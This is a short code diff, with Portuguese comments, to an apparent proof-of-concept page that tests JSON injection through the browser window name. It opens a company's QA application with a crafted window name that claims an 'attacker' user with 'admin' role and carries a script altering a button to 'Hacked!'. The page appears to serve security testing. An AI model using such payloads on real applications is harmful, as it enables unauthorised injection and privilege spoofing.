@@ -38,8 +38,15 @@
     <script>
         function openTarget() {
             // Abrir a aplicação alvo com um nome de janela malicioso
-            window.open('https://qa.neoway.com.br/apps/', 'maliciousWindow');
-            document.getElementById('status').innerHTML = 'Aplicação alvo aberta. Verifique a nova janela para ver se a injeção de JSON foi bem-sucedida.';}
+            const maliciousWindowName = JSON.stringify({
+                user: "attacker",
+                role: "admin",
+                script: "document.querySelector('button').innerText='Hacked!';"
+            });
+            window.open('https://qa.neoway.com.br/apps/', maliciousWindowName);
+            document.getElementById('status').innerHTML = 'Aplicação alvo aberta. Verifique a nova janela para ver se a injeção de JSON foi bem-sucedida.';
+        }
+
         // Verificar se a injeção de JSON foi bem-sucedida
         window.onload = function() {
             try {
